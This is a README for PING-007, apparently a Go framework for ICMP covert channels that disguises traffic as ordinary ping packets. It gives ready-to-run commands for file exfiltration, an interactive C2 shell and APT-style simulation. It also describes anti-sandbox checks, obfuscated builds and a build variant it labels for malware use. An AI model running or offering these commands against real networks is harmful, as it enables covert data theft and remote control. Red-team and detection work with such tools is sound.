# PING-007 Framework

ICMP covert channel framework for offensive security operations and defensive testing. Go implementation with packet-level stealth and Linux ping mimicry.

[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)]()
[![Go Version](https://img.shields.io/badge/go-1.21+-blue)]()
[![License](https://img.shields.io/badge/license-MIT-green)]()
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey)]()

## Quick Start

```bash
# Build
git clone <repository>
cd ping-007
make build

# Basic transmission (stealth mode recommended)
sudo ./build/ping-007 basic -t 192.168.1.100 -d "data" --stealth

# File exfiltration
sudo ./build/ping-007 exfil -t 192.168.1.100 -f /path/to/file.txt

# APT simulation
sudo ./build/ping-007 apt -t 192.168.1.100 -p lazarus --duration 300

# Traffic analysis
sudo ./build/ping-007 analyze --duration 60
```

## Core Features

### Network Operations
- Raw ICMP packet construction
- Linux ping packet mimicry (identical wire format)
- PID-based identifiers matching ping behavior
- Steganography in payload regions
- Multi-platform support (Linux, macOS, Windows)

### Encryption
- AES256-GCM with authentication
- ChaCha20-Poly1305 
- Custom XOR algorithms
- Automatic key rotation (5min intervals)
- Crypto-agility implementation

### Evasion Techniques
- Anti-sandbox detection
- Adaptive timing with jitter
- Service mimicry patterns
- Traffic analysis resistance
- Entropy matching

### APT Profiles
- Lazarus Group (North Korea)
- APT29 Cozy Bear (Russia)
- APT28 Fancy Bear (Russia)  
- Equation Group (NSA)

## Usage

### Basic Commands

```bash
# Standard transmission
sudo ./build/ping-007 basic -t <target> -d "<message>"

# Stealth transmission with Linux signature
sudo ./build/ping-007 basic -t <target> -d "<message>" --stealth --signature linux

# File exfiltration
sudo ./build/ping-007 exfil -t <target> -f <file> [--method icmp_tunnel] [--mode stealth]

# APT simulation
sudo ./build/ping-007 apt -t <target> -p <profile> --duration <seconds>

# Interactive shell
sudo ./build/ping-007 shell -t <target> --mode interactive

# Traffic listener
sudo ./build/ping-007 listen --interface <iface> --output <dir> --timeout <seconds>

# Network analysis
sudo ./build/ping-007 analyze --duration <seconds>
./build/ping-007 analyze --passive --duration <seconds>  # No root required
```

### Make Operations (Convenience Targets)

```bash
# Basic ICMP operations
make basic TARGET=192.168.1.100 DATA="test message"
make stealth TARGET=192.168.1.100 DATA="covert message"

# Data exfiltration
make exfil TARGET=192.168.1.100 FILE=secret.txt [METHOD=icmp_tunnel] [MODE=stealth]

# APT simulation  
make apt TARGET=192.168.1.100 PROFILE=lazarus [DURATION=300]

# Interactive operations
make shell TARGET=192.168.1.100 [MODE=interactive]
make listen [OUTPUT=./received] [TIMEOUT=300]

# Analysis and status
make status             # Framework status check
make analyze [DURATION=60]
```

### Unprivileged Operations

```bash
# Status without raw socket access
./build/ping-007 status --safe

# Configuration validation
./build/ping-007 status --no-network  

# Passive traffic analysis
./build/ping-007 analyze --passive --duration 60

# Help and version
./build/ping-007 --help
./build/ping-007 --version
```

### APT Profiles

| Profile | Description | Timing Range | Crypto Preference |
|---------|-------------|--------------|------------------|
| `lazarus` | Lazarus Group (DPRK) | 5min - 1hour | AES256 |
| `apt29` | Cozy Bear (Russia) | 30min - 2hours | ChaCha20 |
| `apt28` | Fancy Bear (Russia) | 10min - 30min | Custom XOR |
| `equation` | Equation Group (NSA) | 1day - 3days | RSA hybrid |

## Installation

### Requirements
- Go 1.21+
- Root privileges for raw socket operations
- Linux, macOS, or Windows

### Build Options

```bash
# Standard builds
make build               # Standard build for current platform
make build-all          # All platforms (Linux, Windows, macOS)

# Specialized builds
make build-minimal      # Minimal features (no APT simulation)
make build-embedded     # Embedded configuration
make build-internet     # Internet-enabled defaults
make build-micro        # Micro build variant
make build-stealth      # Stealth with evasion techniques
make build-ghost        # Ghost mode build
make build-compressed   # UPX compressed binary
make build-garble       # Obfuscated with garble tool
make build-armored      # Ultimate protection (stealth mode)

# Combined builds  
make build-minimal-internet    # Minimal + Internet access
make build-minimal-stealth     # Minimal + stealth obfuscation
make build-ultimate           # Ultimate variant (minimal+internet+stealth)

# Development & setup
make setup              # Install dependencies and setup
make deps               # Download Go modules
make clean              # Remove build artifacts
make dev                # Development mode
```

### Build Tags

| Tag | Description | Use Case |
|-----|-------------|----------|
| `minimal` | Core ICMP only | Malware, size constraints |
| `embedded` | Compiled config | Standalone deployments |
| `internet` | Internet targets | External exfiltration |
| `stealth` | Enhanced evasion | High-security environments |

## Configuration

Main configuration: `config/ping-007.yml`

```yaml
framework:
  name: "PING-007"
  version: "2.0.0"
  environment: "production"

network:
  authorized_targets:
    - "192.168.0.0/16"
    - "10.0.0.0/8" 
    - "172.16.0.0/12"
  default_interface: "eth0"
  timeout: 30

evasion:
  crypto_agility:
    enabled: true
    algorithms: ["aes256", "chacha20", "custom_xor"]
    rotation_interval: 3600
  
  anti_sandbox:
    enabled: true
    min_uptime: 1800
    min_processes: 50
    
  timing_evasion:
    enabled: true
    adaptive_delays: true
    jitter_percentage: 0.15

security:
  audit_logging: true
  session_timeout: 3600
  data_retention_days: 90
```

### Target Authorization

```yaml
# Local networks only (default)
authorized_targets:
  - "192.168.0.0/16"
  - "10.0.0.0/8"
  - "172.16.0.0/12"
  - "203.0.113.0/24"

# Enterprise pentest
# authorized_targets:
#   - "10.50.0.0/16"
#   - "192.168.100.0/24"

# External server access
# authorized_targets:
#   - "192.168.0.0/16"
#   - "45.33.32.156/32"

# Internet access (use with caution)
# authorized_targets:
#   - "0.0.0.0/0"
# forbidden_targets:
#   - "127.0.0.0/8"
#   - "169.254.0.0/16"
```

## Technical Details

### Packet Structure

**Linux Ping Mimicry (64 bytes total):**
```
IP Header:    20 bytes
ICMP Header:   8 bytes (Type 8, Code 0, Checksum, ID, Sequence)
ICMP Payload: 56 bytes (8-byte timestamp + 48-byte pattern)
```

**Windows Ping Mimicry (40 bytes total):**
```
IP Header:    20 bytes  
ICMP Header:   8 bytes
ICMP Payload: 32 bytes (alphabet pattern: "abcdefghijklmnop...")
```

### Steganography

Data is hidden within legitimate ping patterns using XOR steganography:

```
Original: 08 09 0a 0b 0c 0d 0e 0f ...  (Linux ping pattern)
Hidden:   0a 0f 0c 0d 0e 0b 0a 0c ...  (data XORed into pattern)
```

### Performance

- Packet generation: ~50,000 packets/second
- Encryption throughput: ~200 MB/second (AES256)
- Memory usage: ~60MB baseline + ~5MB per session
- CPU overhead: <2% on modern hardware

## Project Structure

```
ping-007/
├── cmd/ping-007/           # CLI entry point
├── internal/
│   ├── config/            # Configuration management
│   ├── crypto/            # Encryption engines
│   ├── evasion/           # Stealth techniques
│   ├── exfiltration/      # Data extraction
│   ├── logger/            # Structured logging
│   ├── network/           # Raw ICMP sockets
│   ├── orchestrator/      # Main coordination
│   └── shell/             # Interactive C2
├── pkg/types/             # Type definitions
├── config/                # Configuration files
└── build/                 # Compiled binaries
```

## Security Considerations

### Legal Compliance
- Use only on authorized networks
- Maintain detailed operation logs
- Follow applicable laws and regulations
- Implement responsible disclosure for findings

### Detection Risks
- ICMP traffic logging by security tools
- Behavioral analysis of repeated patterns
- Deep packet inspection of payload entropy
- Timing analysis by sophisticated systems

### Operational Security
- Target validation enforced by framework
- All operations logged for compliance
- Configurable session limits and timeouts
- Encryption for sensitive data

## Troubleshooting

### Common Issues

**Permission Denied:**
```bash
Error: failed to create ICMP connection (need root)
Solution: Run with sudo or check CAP_NET_RAW capability
```

**Invalid Target:**
```bash
Error: target validation failed
Solution: Add target to authorized_targets in config/ping-007.yml
```

**Network Interface Not Found:**
```bash
Error: Device "eth0" does not exist
Solution: Check available interfaces with 'ip link show'
```

### Debug Mode

```bash
# Verbose output
sudo ./build/ping-007 --verbose status

# Configuration check
./build/ping-007 status --safe

# Network connectivity test  
sudo ./build/ping-007 basic -t 127.0.0.1 -d "test"
```

## Development

### Build System

```bash
# Setup and dependencies
make setup              # Install dependencies and setup environment
make deps               # Download Go modules
make go-setup           # Install Go and development tools
make install-deps       # Install all optional dependencies (UPX, tools)
make install-garble     # Install Garble obfuscation tool
make install-upx        # Install UPX compression tool

# Build and test
make build              # Standard build for current platform
make test               # Run test suite with coverage
make lint               # Code quality checks
make format             # Format code
make clean              # Remove build artifacts

# Quality assurance
make security-check     # Security validation
make vuln-check         # Vulnerability checking
make benchmark          # Performance benchmarks
make quick-test         # Quick test suite
make ci                 # Continuous integration pipeline

# Documentation and examples
make docs               # Generate Go documentation
make examples           # Show usage examples  
make redteam-examples   # Red team operation examples
make blueteam-examples  # Blue team testing examples

# Operations (require built binary)
make status             # Framework status check
make demo               # Interactive demonstration
make stats              # Framework statistics
```

### Testing

```bash
# Full test suite
make test

# Component tests
go test ./internal/network/ -v
go test ./internal/crypto/ -v

# OPSEC validation
sudo ./build/ping-007 analyze --duration 60 &
sudo ./build/ping-007 basic -t 192.168.1.100 -d "test" --stealth
```

## License

MIT License - see [LICENSE](LICENSE) file for details.

### Disclaimer

This software is intended for authorized security testing, penetration testing, and educational purposes only. Users are responsible for compliance with applicable laws and regulations. Unauthorized use is prohibited.

---

**PING-007 Framework - Professional ICMP Operations**